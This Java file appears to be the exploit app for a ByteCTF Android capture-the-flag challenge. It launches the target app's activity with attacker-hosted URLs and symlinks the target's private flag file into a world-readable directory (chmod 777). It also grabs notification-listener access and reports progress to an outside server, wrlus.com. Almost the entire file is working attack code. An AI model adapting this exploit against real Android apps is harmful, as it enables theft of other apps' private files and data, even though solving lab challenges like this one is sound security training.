package com.bytectf.pwnmediumdroid;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationManagerCompat;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.StrictMode;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;
import java.util.Set;

public class MainActivity extends AppCompatActivity {
    public static boolean pendingIntentSent = false;
    public Uri uri_visit_jsi_intent =
            Uri.parse("http://toutiao.com.bytectf.wrlus.com/visit_jsi_intent.html");
    public Uri uri_visit_flag =
            Uri.parse("http://toutiao.com.bytectf.wrlus.com/visit_flag.html");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        if (!isNotificationListenerEnabled()) {
            startNotificationListenerSettings();
            return;
        }

        exploitTestActivity(uri_visit_jsi_intent);
        createSymlink();

        new Handler().postDelayed(()->{
            if (pendingIntentSent)
                exploitTestActivity(uri_visit_flag);
        }, 10000);
    }

    private void exploitTestActivity(Uri uri) {
        Intent intent = new Intent();
        intent.setData(uri);
        intent.setClassName("com.bytectf.mediumdroid",
                "com.bytectf.mediumdroid.MainActivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void createSymlink() {
        String flagFile = "/data/data/com.bytectf.mediumdroid/files/flag";
        String symlinkFile = "/data/data/com.bytectf.pwnmediumdroid/symlink.html";

        try {
            Runtime.getRuntime().exec("ln -s " + flagFile + " " + symlinkFile).waitFor();
//            Note: Must change permission for the whole folder !
            Runtime.getRuntime().exec("chmod -R 777 /data/data/com.bytectf.pwnmediumdroid/").waitFor();
            Runtime.getRuntime().exec("chmod 777 " + symlinkFile).waitFor();

            requestServer("ping=symlinkSucc&time" + new Date().toString());
        } catch (Exception e) {
            e.printStackTrace();
            requestServer("ping=createSymlinkError&time" + new Date().toString());
        }
    }

    private void requestServer(String param) {
        try {
            String u = "http://wrlus.com/?" + param;
            URL url = new URL(u);
            URLConnection connection = url.openConnection();
            connection.setConnectTimeout(60000);
            connection.setReadTimeout(60000);
            connection.connect();
            BufferedReader uReader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream()));

            uReader.readLine();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean isNotificationListenerEnabled() {
        return NotificationManagerCompat
                .getEnabledListenerPackages(this).contains(getPackageName());
    }

    public void startNotificationListenerSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}